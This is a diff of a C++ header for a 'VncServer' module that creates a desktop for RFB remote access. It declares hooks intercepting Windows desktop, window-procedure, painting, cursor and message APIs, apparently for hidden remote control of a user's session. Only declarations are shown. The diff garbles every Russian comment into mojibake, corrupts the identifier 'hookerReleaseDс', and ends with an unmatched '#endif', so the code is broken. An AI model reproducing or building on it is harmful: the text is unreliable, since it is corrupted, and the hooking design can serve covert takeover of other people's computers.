@@ -1,5 +1,5 @@
 /*
-  Создание и управление декстопом для удаленного доступа по протоколу RFB.
+  РЎРѕР·РґР°РЅРёРµ Рё СѓРїСЂР°РІР»РµРЅРёРµ РґРµРєСЃС‚РѕРїРѕРј РґР»СЏ СѓРґР°Р»РµРЅРЅРѕРіРѕ РґРѕСЃС‚СѓРїР° РїРѕ РїСЂРѕС‚РѕРєРѕР»Сѓ RFB.
 */
 #pragma once
 
@@ -7,200 +7,200 @@
 namespace VncServer
 {
   /*
-    Инициализация.
+    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void init(void);
 
   /*
-    Деинициализация.
+    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void uninit(void);
 
   /*
-    Создание сессии.
+    РЎРѕР·РґР°РЅРёРµ СЃРµСЃСЃРёРё.
 
-    IN s   - сокет клиента.
+    IN s   - СЃРѕРєРµС‚ РєР»РёРµРЅС‚Р°.
     
-    Return - true - в случаи успешной сессии,
-             false - в случаи ошибки.
+    Return - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС€РЅРѕР№ СЃРµСЃСЃРёРё,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
   */
   bool start(SOCKET s);
 
   /*
-    Запуск цикла рисования окон.
+    Р—Р°РїСѓСЃРє С†РёРєР»Р° СЂРёСЃРѕРІР°РЅРёСЏ РѕРєРѕРЅ.
 
-    Return - true - в случаи успеха,
-             false - в случаи ошибки.
+    Return - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
   */
   bool startAsPaintThread(void);
 
   /*
-    Перехватчик OpenInputDesktop.
+    РџРµСЂРµС…РІР°С‚С‡РёРє OpenInputDesktop.
   */
   HDESK WINAPI hookerOpenInputDesktop(DWORD flags, BOOL inherit, ACCESS_MASK desiredAccess);
 
   /*
-    Перехватчик SwitchDesktop.
+    РџРµСЂРµС…РІР°С‚С‡РёРє SwitchDesktop.
   */
   BOOL WINAPI hookerSwitchDesktop(HDESK desktop);
 
   /*
-    Перехватчик DefWindowProcW.
+    РџРµСЂРµС…РІР°С‚С‡РёРє DefWindowProcW.
   */
   LRESULT WINAPI hookerDefWindowProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);
 
   /*
-    Перехватчик DefWindowProcA.
+    РџРµСЂРµС…РІР°С‚С‡РёРє DefWindowProcA.
   */
   LRESULT WINAPI hookerDefWindowProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);
 
   /*
-    Перехватчик DefDlgProcW.
+    РџРµСЂРµС…РІР°С‚С‡РёРє DefDlgProcW.
   */
   LRESULT WINAPI hookerDefDlgProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);
 
   /*
-    Перехватчик DefDlgProcA.
+    РџРµСЂРµС…РІР°С‚С‡РёРє DefDlgProcA.
   */
   LRESULT WINAPI hookerDefDlgProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);
 
   /*
-    Перехватчик DefFrameProcW.
+    РџРµСЂРµС…РІР°С‚С‡РёРє DefFrameProcW.
   */
   LRESULT WINAPI hookerDefFrameProcW(HWND frame, HWND client, UINT msg, WPARAM wParam, LPARAM lParam);
   
   /*
-    Перехватчик DefFrameProcA.
+    РџРµСЂРµС…РІР°С‚С‡РёРє DefFrameProcA.
   */
   LRESULT WINAPI hookerDefFrameProcA(HWND frame, HWND client, UINT msg, WPARAM wParam, LPARAM lParam);
 
   /*
-    Перехватчик DefMDIChildProcW.
+    РџРµСЂРµС…РІР°С‚С‡РёРє DefMDIChildProcW.
   */
   LRESULT WINAPI hookerDefMDIChildProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);
 
   /*
-    Перехватчик DefMDIChildProcA.
+    РџРµСЂРµС…РІР°С‚С‡РёРє DefMDIChildProcA.
   */
   LRESULT WINAPI hookerDefMDIChildProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);  
     
   /*
-    Перехватчик CallWindowProcW.
+    РџРµСЂРµС…РІР°С‚С‡РёРє CallWindowProcW.
   */
   LRESULT WINAPI hookerCallWindowProcW(WNDPROC prevWndFunc, HWND window, UINT msg, WPARAM wParam, LPARAM lParam);
 
   /*
-    Перехватчик CallWindowProcW.
+    РџРµСЂРµС…РІР°С‚С‡РёРє CallWindowProcW.
   */
   LRESULT WINAPI hookerCallWindowProcA(WNDPROC prevWndFunc, HWND window, UINT msg, WPARAM wParam, LPARAM lParam);
 
   /*
-    Перехватчик RegisterClassW.
+    РџРµСЂРµС…РІР°С‚С‡РёРє RegisterClassW.
   */
   ATOM WINAPI hookerRegisterClassW(WNDCLASSW *wndClass);
   
   /*
-    Перехватчик RegisterClassA.
+    РџРµСЂРµС…РІР°С‚С‡РёРє RegisterClassA.
   */
   ATOM WINAPI hookerRegisterClassA(WNDCLASSA *wndClass);
 
   /*
-    Перехватчик RegisterClassExW.
+    РџРµСЂРµС…РІР°С‚С‡РёРє RegisterClassExW.
   */
   ATOM WINAPI hookerRegisterClassExW(WNDCLASSEXW *wndClass);
 
   /*
-    Перехватчик RegisterClassExA.
+    РџРµСЂРµС…РІР°С‚С‡РёРє RegisterClassExA.
   */
   ATOM WINAPI hookerRegisterClassExA(WNDCLASSEXA *wndClass);
 
   /*
-    Перехватчик BeginPaint.
+    РџРµСЂРµС…РІР°С‚С‡РёРє BeginPaint.
   */
   HDC WINAPI hookerBeginPaint(HWND window, LPPAINTSTRUCT paint);
   
   /*
-    Перехватчик EndPaint.
+    РџРµСЂРµС…РІР°С‚С‡РёРє EndPaint.
   */
   BOOL WINAPI hookerEndPaint(HWND window, const PAINTSTRUCT *paint);
   
   /*
-    Перехватчик GetDCEx.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetDCEx.
   */
   HDC WINAPI hookerGetDcEx(HWND window, HRGN clip, DWORD flags);
   
   /*
-    Перехватчик GetDC.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetDC.
   */
   HDC WINAPI hookerGetDc(HWND window);
 
   /*
-    Перехватчик GetWindowDC.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetWindowDC.
   */
   HDC WINAPI hookerGetWindowDc(HWND window);
 
   /*
-    Перехватчик ReleaseDC.
+    РџРµСЂРµС…РІР°С‚С‡РёРє ReleaseDC.
   */
-  int WINAPI hookerReleaseDс(HWND window, HDC dc);
+  int WINAPI hookerReleaseDСЃ(HWND window, HDC dc);
 
   /*
-    Перехватчик GetUpdateRect.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetUpdateRect.
   */
   BOOL WINAPI hookerGetUpdateRect(HWND window, LPRECT rect, BOOL erase);
   
   /*
-    Перехватчик GetUpdateRgn.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetUpdateRgn.
   */
   int WINAPI hookerGetUpdateRgn(HWND window, HRGN rgn, BOOL erase);
 
   /*
-    Перехватчик GetMessagePos.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetMessagePos.
   */
   DWORD WINAPI hookerGetMessagePos(void);
   
   /*
-    Перехватчик GetCursorPos.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetCursorPos.
   */
   BOOL WINAPI hookerGetCursorPos(LPPOINT point);
 
   /*
-    Перехватчик SetCursorPos.
+    РџРµСЂРµС…РІР°С‚С‡РёРє SetCursorPos.
   */
   BOOL WINAPI hookerSetCursorPos(int x, int y);
 
   /*
-    Перехватчик SetCapture.
+    РџРµСЂРµС…РІР°С‚С‡РёРє SetCapture.
   */
   HWND WINAPI hookerSetCapture(HWND window);
 
   /*
-    Перехватчик ReleaseCapture.
+    РџРµСЂРµС…РІР°С‚С‡РёРє ReleaseCapture.
   */
   BOOL WINAPI hookerReleaseCapture(void);
 
   /*
-    Перехватчик GetCapture.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetCapture.
   */
   HWND WINAPI hookerGetCapture(void);
 
   /*
-    Перехватчик GetMessageW.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetMessageW.
   */
   BOOL WINAPI hookerGetMessageW(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax);
 
   /*
-    Перехватчик GetMessageA.
+    РџРµСЂРµС…РІР°С‚С‡РёРє GetMessageA.
   */
   BOOL WINAPI hookerGetMessageA(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax);
 
   /*
-    Перехватчик PeekMessageW.
+    РџРµСЂРµС…РІР°С‚С‡РёРє PeekMessageW.
   */
   BOOL WINAPI hookerPeekMessageW(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax, UINT removeMsg);
 
-  /*В В В В Interceptor PeekMessageA.
-В В */
+  /*Р’В Р’В Р’В Р’В Interceptor PeekMessageA.
+Р’В Р’В */
   BOOL WINAPI hookerPeekMessageA(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax, UINT removeMsg);
 };
 #endif
